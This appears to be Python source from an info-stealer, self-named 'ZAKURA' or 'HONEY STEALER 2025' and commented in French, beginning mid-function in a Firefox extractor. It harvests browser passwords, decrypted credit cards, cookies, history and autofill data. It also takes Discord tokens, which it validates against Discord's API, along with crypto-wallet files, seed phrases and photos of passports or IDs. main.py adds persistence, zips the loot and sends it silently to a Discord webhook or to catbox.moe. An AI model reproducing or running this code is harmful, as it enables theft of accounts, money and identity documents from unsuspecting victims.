        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db").name

        try:
            if copy_db(str(form_db), tmp):
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("""
                    SELECT fieldname, value, timesUsed, firstUsed, lastUsed
                    FROM moz_formhistory
                """)
                entries = []
                for name, value, times, first, last in cur.fetchall():
                    if value:
                        first_str = datetime.fromtimestamp(first / 1_000_000).strftime("%Y-%m-%d %H:%M") if first else "N/A"
                        last_str = datetime.fromtimestamp(last / 1_000_000).strftime("%Y-%m-%d %H:%M") if last else "N/A"
                        entries.append(
                            f"[{name}] : {value} | Utilisé {times}x | {first_str} → {last_str}"
                        )
                conn.close()

                if entries:
                    dumper.save(
                        f"Firefox_{profile_name}_form_autofill.txt",
                        "\n".join(entries),
                        "Autofill"
                    )
        except Exception:
            pass
        finally:
            try:
                os.unlink(tmp)
            except:
                pass


# ============================================================
#  ADRESSES ENREGISTRÉES
# ============================================================
def extract_firefox_addresses(dumper):
    profiles_dir = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(profiles_dir):
        return

    for profile_dir in glob.glob(os.path.join(profiles_dir, "*.*")):
        if not os.path.isdir(profile_dir):
            continue

        profile_name = os.path.basename(profile_dir)
        lines = []

        # addresses.json
        addr_json = os.path.join(profile_dir, "addresses.json")
        if os.path.exists(addr_json):
            try:
                with open(addr_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for addr in data.get("addresses", []):
                    lines.append(f"[ADRESSE] {addr.get('given-name', '')} {addr.get('family-name', '')}")
                    for k in ["street-address", "locality", "region", "postal-code", "country", "tel", "email"]:
                        if addr.get(k):
                            lines.append(f"  {k} : {addr[k]}")
                    lines.append("---")
            except:
                pass

        # formhistory.sqlite (complément)
        formhistory = os.path.join(profile_dir, "formhistory.sqlite")
        if os.path.exists(formhistory):
            temp_db = tempfile.NamedTemporaryFile(delete=False).name
            try:
                shutil.copy(formhistory, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT fieldname, value FROM moz_formhistory WHERE value IS NOT NULL")
                for field, value in cursor.fetchall():
                    if any(x in field.lower() for x in ["address", "city", "postal", "country", "street"]):
                        lines.append(f"{field} : {value}")
                conn.close()
            except:
                pass
            finally:
                try:
                    os.unlink(temp_db)
                except:
                    pass

        if lines:
            dumper.save(
                f"Firefox_{profile_name}_addresses.txt",
                "\n".join(lines),
                "Autofill"
            )


# ============================================================
#  CARTES BANCAIRES
# ============================================================
def extract_firefox_creditcards(dumper):
    profiles_dir = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(profiles_dir):
        return

    for profile_dir in glob.glob(os.path.join(profiles_dir, "*.*")):
        if not os.path.isdir(profile_dir):
            continue

        profile_name = os.path.basename(profile_dir)
        logins_path = os.path.join(profile_dir, "logins.json")
        if not os.path.exists(logins_path):
            continue

        if not nss_init(profile_dir):
            continue

        try:
            with open(logins_path, "r", encoding="utf-8") as f:
                data = json.load(f)

            cards = []
            for entry in data.get("logins", []):
                cc_enc = entry.get("cc-number-encrypted")
                if not cc_enc:
                    continue
                decrypted_number = nss_decrypt(cc_enc)
                card = {
                    "name": entry.get("cc-name", ""),
                    "number": decrypted_number,
                    "exp_month": entry.get("cc-exp-month"),
                    "exp_year": entry.get("cc-exp-year"),
                    "created": entry.get("timeCreated")
                }
                cards.append(card)

            if cards:
                lines = []
                for card in cards:
                    created = (
                        datetime.fromtimestamp(card["created"] / 1000).strftime("%Y-%m-%d %H:%M")
                        if card.get("created") else "N/A"
                    )
                    lines.append(f"[CARTE] {card['name']}")
                    lines.append(f"  Numéro   : {card['number']}")
                    lines.append(f"  Exp       : {card['exp_month']}/{card['exp_year']}")
                    lines.append(f"  Créé      : {created}")
                    lines.append("---")

                dumper.save(
                    f"Firefox_{profile_name}_creditcards.txt",
                    "\n".join(lines),
                    "Autofill"
                )
        except Exception:
            pass


# ============================================================
#  HISTORIQUE NAVIGATION
# ============================================================
def extract_firefox_history(dumper):
    profiles = firefox_profiles()
    if not profiles:
        return

    for profile in profiles:
        places = profile / "places.sqlite"
        if not places.exists():
            continue

        profile_name = profile.name
        tmp = Path(tempfile.gettempdir()) / f"fx_{profile_name}.sqlite"

        if not safe_copy_full(places, tmp):
            continue

        try:
            conn = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True, timeout=30)
            cur = conn.cursor()
            cur.execute("""
                SELECT
                    COALESCE(url, ''),
                    COALESCE(title, 'Sans titre'),
                    DATETIME(last_visit_date/1000000, 'unixepoch')
                FROM moz_places
                WHERE url IS NOT NULL
                ORDER BY last_visit_date DESC
            """)
            rows = cur.fetchall()
            conn.close()

            if rows:
                lines = ["URL | Titre | Date", "-"*120]
                for url, title, date in rows:
                    lines.append(f"{url} | {title[:80]} | {date or 'Inconnu'}")

                dumper.save(
                    f"History_Firefox_{profile_name}.txt",
                    "\n".join(lines),
                    "History"
                )
        except Exception:
            pass
        finally:
            try:
                tmp.unlink(missing_ok=True)
                Path(str(tmp) + "-wal").unlink(missing_ok=True)
                Path(str(tmp) + "-shm").unlink(missing_ok=True)
            except:
                pass


# ============================================================
#  COOKIES
# ============================================================
def extract_firefox_cookies(dumper):
    profiles_dir = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
    if not profiles_dir.exists():
        return

    for profile in profiles_dir.iterdir():
        if not profile.is_dir():
            continue

        profile_name = profile.name
        cookies_db = profile / "cookies.sqlite"
        if not cookies_db.exists():
            continue

        if not nss_init(str(profile)):
            continue

        temp_copy = Path(tempfile.gettempdir()) / f"cookies_{profile_name}.sqlite"
        try:
            shutil.copy2(cookies_db, temp_copy)
            for ext in ["-wal", "-shm"]:
                src = profile / f"cookies.sqlite{ext}"
                if src.exists():
                    shutil.copy2(src, temp_copy.with_suffix(temp_copy.suffix + ext))
        except:
            continue

        cookies_list = []
        try:
            conn = sqlite3.connect(f"file:{temp_copy}?mode=ro", uri=True, timeout=30)
            cur = conn.cursor()
            cur.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                FROM moz_cookies
            """)
            for host, name, value, path, expiry, secure, httponly in cur.fetchall():
                decrypted_value = nss_decrypt(value) or value
                cookie_obj = {
                    "host": host,
                    "name": name,
                    "value": decrypted_value,
                    "path": path or "/",
                    "secure": bool(secure),
                    "httpOnly": bool(httponly),
                    "sameSite": "no_restriction",
                    "expirationDate": expiry if expiry else 0
                }
                cookies_list.append(cookie_obj)
            conn.close()
        except Exception:
            pass
        finally:
            for p in [temp_copy, Path(str(temp_copy) + "-wal"), Path(str(temp_copy) + "-shm")]:
                try:
                    p.unlink(missing_ok=True)
                except:
                    pass

        if cookies_list:
            dumper.save(
                f"Firefox_{profile_name}_cookies.json",
                json.dumps(cookies_list, indent=2, ensure_ascii=False),
                "Cookies"
            )

# ===== FILE: files.py =====

# files.py – ZAKURA STEALER 2025 – FILE GRABBER INTELLIGENT
import os
from pathlib import Path

# ===================================================================
# CONFIG
# ===================================================================
MAX_FILE_SIZE = 3 * 1024 * 1024

CRITICAL_EXT = {
    ".txt", ".json", ".log", ".db", ".sqlite", ".wallet", ".dat", ".bak",
    ".csv", ".kdbx", ".xml", ".env", ".yml", ".yaml", ".conf", ".config," ".jpg"
}

PHOTO_EXT = {".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp", ".heic", ".tiff"}

CRITICAL_KEYWORDS = [
    "seed", "mnemonic", "phrase", "recovery", "backup", "privatekey", "keystore",
    "wallet", "metamask", "phantom", "exodus", "trust", "atomic", "coinbase",
    "binance", "ledger", "trezor", "electrum", "2fa", "authy", "password",
    "token", "discord", "session", "cookie", "localstorage", "leveldb", "cv"
]

PHOTO_KEYWORDS = [
    "id", "passport", "passeport", "permis", "license", "driver", "selfie",
    "face", "visage", "kyc", "cin", "cni", "proof", "document", "scan", "identity"
]

# Dossiers à scanner (seulement des Path valides)
PRIORITY_PATHS = [
    Path.home() / "Desktop",
    Path.home() / "Downloads",
    Path.home() / "Documents",
    Path.home() / "Pictures",
    Path.home() / "OneDrive",
    Path.home() / "Bureau",           # Français
    Path.home() / "Téléchargements",
    Path.home() / "Images",
]

# ===================================================================
# FONCTIONS DE DÉTECTION
# ===================================================================
def is_critical_file(p: Path) -> bool:
    if p.suffix.lower() not in CRITICAL_EXT:
        return False
    if p.stat().st_size > MAX_FILE_SIZE:
        return False
    return any(kw in p.name.lower() for kw in CRITICAL_KEYWORDS)

def is_sensitive_photo(p: Path) -> bool:
    if p.suffix.lower() not in PHOTO_EXT:
        return False
    if p.stat().st_size > MAX_FILE_SIZE:
        return False
    return any(kw in p.name.lower() for kw in PHOTO_KEYWORDS)

# ===================================================================
# GRABBER PRINCIPAL
# ===================================================================
def steal_files(dumper):
    grabbed = 0

    for base in PRIORITY_PATHS:
        # Filtre les chemins invalides (ex: Desktop in [...] donnait un bool)
        if not isinstance(base, Path) or not base.exists():
            continue

        for root, _, files in os.walk(base):
            for name in files:
                file_path = Path(root) / name

                try:
                    if file_path.stat().st_size > MAX_FILE_SIZE:
                        continue
                except:
                    continue

                if is_critical_file(file_path) or is_sensitive_photo(file_path):
                    dumper.save_stolen_file(str(file_path))
                    grabbed += 1

    if grabbed > 0:
        report = f"[FILE GRABBER]\nFichiers sensibles volés : {grabbed}\n\n" \
                 f"→ Tri automatique : Desktop • Downloads • Documents • Pictures • Others"
        dumper.save("FILE_GRABBER_REPORT.txt", report, "Files")

# Compatibilité ancienne version
steal_files_background = steal_files

# ===== FILE: discord.py =====

# discord.py (VERSION CORRIGÉE & FONCTIONNELLE – 0 ERREURS)
import os
import re
import base64
import json
import requests
from datetime import datetime
from Crypto.Cipher import AES
# removed: internal import get_master_key
# removed: internal import WEBHOOK_URL, CHROMIUM_BROWSERS


# ==================== EMOJIS (change-les si tu veux) ====================
EMOJIS = {
    "nitro": "Nitro",
    "phone": "Telephone",
    "mail": "Email",
    "key": "Key",
    "lock": "Lock",
    "globe": "Globe",
    "cc": "Credit Card",
    "codes": "Gift",
    "badges": "Badges",
    "staff": "Staff",
    "partner": "Partner",
    "hypesquad": "HypeSquad",
    "bughunter1": "Bug Hunter",
    "bughunter2": "Bug Hunter Gold",
    "bravery": "Bravery",
    "brilliance": "Brilliance",
    "balance": "Balance",
    "early": "Early Supporter",
    "early_developer": "Early Dev",
    "developer": "Verified Dev",
    "nitro_basic": "Nitro Classic",
    "nitro_boost": "Nitro Boost",
}


class DiscordTokenGrabber:
    def __init__(self, dumper):
        self.dumper = dumper
        self.roaming = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.tokens = []
        self.valid_tokens = []

    # ====================== DÉCRYPTAGE ======================
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
        except:
            return None

    def check_token(self, token):
        if not token or len(token) < 50:
            return False
        try:
            r = requests.get("https://discord.com/api/v9/users/@me",
                           headers={"Authorization": token}, timeout=8)
            return r.status_code == 200
        except:
            return False

    # ====================== LEVELDB DISCORD ======================
    def extract_from_leveldb(self, path):
        if not os.path.exists(path):
            return
        for file in os.listdir(path):
            if not file.endswith((".ldb", ".log")):
                continue
            fp = os.path.join(path, file)
            try:
                with open(fp, "rb") as f:
                    content = f.read()
                found = re.findall(rb'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}', content)
                found += re.findall(rb'mfa\.[\w-]{84}', content)
                for t in found:
                    token = t.decode('utf-8', errors='ignore')
                    if token not in self.tokens:
                        self.tokens.append(token)
            except:
                pass

    def extract_encrypted_tokens(self, leveldb_path, local_state_path):
        if not os.path.exists(leveldb_path) or not os.path.exists(local_state_path):
            return
        master_key = get_master_key(local_state_path)
        if not master_key:
            return
        for file in os.listdir(leveldb_path):
            if not file.endswith((".ldb", ".log")):
                continue
            fp = os.path.join(leveldb_path, file)
            try:
                with open(fp, "rb") as f:
                    content = f.read()
                matches = re.findall(rb'dQw4w9WgXcQ:([^"\\]{40,})', content)
                for m in matches:
                    try:
                        buff = base64.b64decode(m)
                        token = self.decrypt_val(buff, master_key)
                        if token and token not in self.tokens:
                            self.tokens.append(token)
                    except:
                        pass
            except:
                pass

    # ====================== NAVIGATEURS CHROMIUM ======================
    def extract_browser_tokens(self):
        for browser in CHROMIUM_BROWSERS:
            base_path = os.path.expandvars(browser["base"])
            if not os.path.exists(base_path):
                continue

            profiles = []
            try:
                for item in os.listdir(base_path):
                    profile_path = os.path.join(base_path, item)
                    if os.path.isdir(profile_path):
                        leveldb = os.path.join(profile_path, "Local Storage", "leveldb")
                        if os.path.exists(leveldb):
                            profiles.append((item, profile_path))
            except:
                pass

            default_leveldb = os.path.join(base_path, "Default", "Local Storage", "leveldb")
            if os.path.exists(default_leveldb):
                profiles.append(("Default", os.path.join(base_path, "Default")))

            local_state = browser.get("state")
            if not local_state:
                continue
            local_state = os.path.expandvars(local_state)
            if not os.path.exists(local_state):
                continue

            master_key = get_master_key(local_state)
            if not master_key:
                continue

            for profile_name, profile_path in profiles:
                leveldb_path = os.path.join(profile_path, "Local Storage", "leveldb")
                if not os.path.exists(leveldb_path):
                    continue

                for file in os.listdir(leveldb_path):
                    if not file.endswith((".ldb", ".log")):
                        continue
                    fp = os.path.join(leveldb_path, file)
                    try:
                        with open(fp, "rb") as f:
                            content = f.read()
                        matches = re.findall(rb'dQw4w9WgXcQ:([^"\\]{40,})', content)
                        for m in matches:
                            try:
                                buff = base64.b64decode(m)
                                token = self.decrypt_val(buff, master_key)
                                if token and token not in self.tokens:
                                    self.tokens.append(token)
                            except:
                                pass
                    except:
                        pass

    # ====================== GRAB TOKENS ======================
    def grab_tokens(self):

        paths = [
            f"{self.roaming}\\discord",
            f"{self.roaming}\\discordcanary",
            f"{self.roaming}\\discordptb",
            f"{self.roaming}\\discorddevelopment",
            f"{self.localappdata}\\Discord",
            f"{self.localappdata}\\DiscordCanary",
            f"{self.localappdata}\\DiscordPTB",
        ]

        for base_path in paths:
            if not os.path.exists(base_path):
                continue
            leveldb = os.path.join(base_path, "Local Storage", "leveldb")
            local_state = os.path.join(base_path, "Local State")
            if os.path.exists(leveldb):
                self.extract_from_leveldb(leveldb)
                self.extract_encrypted_tokens(leveldb, local_state)

        self.extract_browser_tokens()

        self.tokens = list(set(self.tokens))
        for token in self.tokens[:]:
            if self.check_token(token):
                self.valid_tokens.append(token)

    # ====================== UTILITAIRES ======================
    def discord_id_to_date(self, discord_id):
        try:
            timestamp = ((int(discord_id) >> 22) + 1420070400000) / 1000
            return datetime.datetime.fromtimestamp(timestamp, datetime.UTC).strftime("%Y-%m-%d %H:%M:%S")
        except:
            return "Inconnu"

    def get_nitro_status(self, premium_type):
        if premium_type == 1: return f"{EMOJIS['nitro']} {EMOJIS['nitro_basic']}"
        if premium_type == 2: return f"{EMOJIS['nitro']} {EMOJIS['nitro_boost']}"
        return "`Aucun`"

    def get_badges(self, flags):
        if not flags:
            return "`Aucun`"
        badge_map = {
            1<<0: EMOJIS['staff'],
            1<<1: EMOJIS['partner'],
            1<<2: EMOJIS['hypesquad'],
            1<<3: EMOJIS['bughunter1'],
            1<<6: EMOJIS['bravery'],
            1<<7: EMOJIS['brilliance'],
            1<<8: EMOJIS['balance'],
            1<<9: EMOJIS['early'],
            1<<14: EMOJIS['bughunter2'],
            1<<17: EMOJIS['early_developer'],
            1<<22: EMOJIS['developer'],
        }
        badges = [v for k, v in badge_map.items() if flags & k]
        return " ".join(badges) if badges else "`Aucun`"

    def get_billing(self, token):
        try:
            r = requests.get("https://discord.com/api/v10/users/@me/billing/payment-sources",
                           headers={"Authorization": token}, timeout=8)
            if r.status_code == 200 and r.json():
                return "`Carte`" if any(p.get("type") == 1 for p in r.json()) else "`PayPal`"
        except:
            pass
        return "`Aucun`"

    def get_gift_codes(self, token):
        codes = ""
        try:
            headers = {"Authorization": token}
            r = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers, timeout=6)
            if r.status_code == 200:
                for c in r.json():
                    if c.get("code"):
                        codes += f"`{c['code']}` - **{c['promotion']['outbound_title']}**\n"
            r = requests.get("https://discord.com/api/v9/users/@me/entitlements/gifts", headers=headers, timeout=6)
            if r.status_code == 200:
                for g in r.json():
                    if g.get("code"):
                        codes += f"`https://discord.gift/{g['code']}`\n"
        except:
            pass
        return codes.strip() or "`Aucun`"

    # ====================== SAUVEGARDE FICHIER TEXTE ======================
    def save_to_file(self):
        if not self.valid_tokens:
            return

        lines = ["=" * 70,
                 f" DISCORD TOKENS - {len(self.valid_tokens)} valides",
                 "=" * 70, ""]

        for i, token in enumerate(self.valid_tokens, 1):
            try:
                user = requests.get("https://discord.com/api/v10/users/@me",
                                  headers={"Authorization": token}, timeout=8).json()
            except:
                user = {}

            lines += [
                f"--- TOKEN {i} ---",
                f"[COMPTE] {user.get('username','?')}#{user.get('discriminator','0000')} ({user.get('id','?')})",
                f"[TOKEN] {token}",
                f"[EMAIL] {user.get('email', 'Inconnu')}",
                f"[TÉLÉPHONE] {user.get('phone', 'Inconnu')}",
                f"[NITRO] {self.get_nitro_status(user.get('premium_type'))}",
                f"[2FA] {'Oui' if user.get('mfa_enabled') else 'Non'}",
                f"[BADGES] {self.get_badges(user.get('public_flags', 0))}",
                f"[PAIEMENT] {self.get_billing(token)}",
                f"[CRÉÉ LE] {self.discord_id_to_date(user.get('id', '0'))}",
                ""
            ]

        content = "\n".join(lines)
        self.dumper.save("discord_tokens.txt", content, "Discord")

    # ====================== ENVOI EMBEDS WEBHOOK ======================
    def send_embeds(self, gofile_url=None):
        if not self.valid_tokens or not WEBHOOK_URL:
            return

        for token in self.valid_tokens:
            try:
                headers = {"Authorization": token}
                user = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10).json()

                avatar = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar') or '0'}.png?size=256"

                embed = {
                    "title": f"{user['username']}#{user['discriminator']} • {user['id']}",
                    "color": 0x8f00ff,
                    "thumbnail": {"url": avatar},
                    "fields": [
                        {"name": f"Token", "value": f"```{token}```", "inline": False},
                        {"name": f"Email", "value": f"`{user.get('email', 'Non vérifié')}`", "inline": True},
                        {"name": f"Téléphone", "value": f"`{user.get('phone', 'Aucun')}`", "inline": True},
                        {"name": f"Créé le", "value": f"`{self.discord_id_to_date(user['id'])}`", "inline": True},
                        {"name": f"Nitro", "value": self.get_nitro_status(user.get('premium_type')), "inline": True},
                        {"name": f"2FA", "value": "`Oui`" if user.get('mfa_enabled') else "`Non`", "inline": True},
                        {"name": f"Badges", "value": self.get_badges(user.get('public_flags', 0)), "inline": False},
                        {"name": f"Paiement", "value": self.get_billing(token), "inline": True},
                        {"name": f"Codes cadeaux", "value": self.get_gift_codes(token), "inline": False},
                    ],
                    "footer": {"text": "Efilop • Zakura "},
                }

                if gofile_url:
                    embed["fields"].append({
                        "name": "Archive complète",
                        "value": f"[Télécharger ici]({gofile_url})",
                        "inline": False
                    })

                requests.post(WEBHOOK_URL, json={
                    "username": "Lol",
                    "avatar_url": "https://i.imgur.com/4qRELaE.png",
                    "embeds": [embed]
                }, timeout=15)

            except Exception as e:
                continue  # passe au token suivant si erreur

    # ====================== FONCTION PRINCIPALE ======================
    def run(self, gofile_url=None):
        self.grab_tokens()
        self.save_to_file()          # → dans le ZIP
        self.send_embeds(gofile_url=gofile_url)  # → sur ton webhook

# ===== FILE: main.py =====

# main.py – HONEY STEALER 2025 – ZIP PURS SEULEMENT (0 texte, 0 trace)
import os
import getpass
import requests
import threading
import time



# =============================================
# ENVOI ZIP DIRECT DISCORD – 100% SILENCIEUX (juste le fichier, rien d'autre)
# =============================================
def send_direct(zip_path: str):
    if not zip_path or not os.path.exists(zip_path):
        return False
    if os.path.getsize(zip_path) >= 8 * 1024 * 1024:  # Limite Discord gratuit
        return False
    try:
        with open(zip_path, "rb") as f:
            requests.post(
                WEBHOOK_URL,
                data={"content": ""},  # AUCUN message
                files={"file": (os.path.basename(zip_path), f)},
                timeout=180
            )
        size_mb = os.path.getsize(zip_path) / (1024 * 1024)
        return True
    except Exception as e:
        return False


# =============================================
# UPLOAD CATBOX (fallback si > 25 Mo)
# =============================================
def upload_catbox(zip_path: str):
    if not zip_path or not os.path.exists(zip_path):
        return None
    try:
        with open(zip_path, "rb") as f:
            r = requests.post(
                "https://catbox.moe/user/api.php",
                data={"reqtype": "fileupload"},
                files={"fileToUpload": f},
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=400
            )
        if r.status_code == 200 and "catbox.moe" in r.text:
            return r.text.strip()
    except:
        pass
    return None


# =============================================
# WEBHOOK SIMPLE (seulement pour les liens Catbox)
# =============================================
def send_webhook(content: str):
    try:
        requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)
    except:
        pass


# =============================================
# MAIN – VERSION FINALE 2025 (ZIP SEULEMENT)
# =============================================
def main():
    pwd = None
    dumper = DataDumper(zip_output=True, password=pwd)

    try:

        # === 1. Vol des données sensibles ===
        for browser in CHROMIUM_BROWSERS:
            base = os.path.expandvars(browser["base"])
            profiles = get_existing_profiles(base) or [""]
            for profile in profiles:
                extract_chromium_passwords(browser, profile, dumper)
                extract_chromium_autofill(browser, profile, dumper)
                extract_chromium_cookies(browser, profile, dumper)
                extract_chromium_history(browser, profile, dumper)

        extract_firefox_passwords(dumper)
        extract_firefox_formhistory(dumper)
        extract_firefox_addresses(dumper)
        extract_firefox_creditcards(dumper)
        extract_firefox_history(dumper)
        extract_firefox_cookies(dumper)
        get_system_full(dumper)
        get_screens(dumper)
        advanced_persistence()

        grabber = DiscordTokenGrabber(dumper)
        grabber.run()  # envoie déjà l'embed avec ID + token

        # === 2. File grabber en fond ===
        thread = threading.Thread(target=steal_files, args=(dumper,), daemon=False)
        thread.start()
        time.sleep(15)
        thread.join(timeout=180)
        if thread.is_alive():
            time.sleep(30)

        # === 3. Création des ZIP ===
        light_zip = dumper.compress(exclude_folder="Files")  # Sans fichiers lourds
        full_zip  = dumper.compress()                         # Avec tout

        # === 4. Envoi silencieux (seulement les ZIP) ===
        if light_zip:
            if not send_direct(light_zip):
                link = upload_catbox(light_zip)
                if link:
                    send_webhook(link)

        if full_zip:
            if not send_direct(full_zip):
                link = upload_catbox(full_zip)
                if link:
                    send_webhook(link)

    except Exception as e:
        send_webhook(f"[ERREUR] {str(e)}")

    finally:
        time.sleep(3)
        dumper.cleanup()




if __name__ == "__main__":
    main()

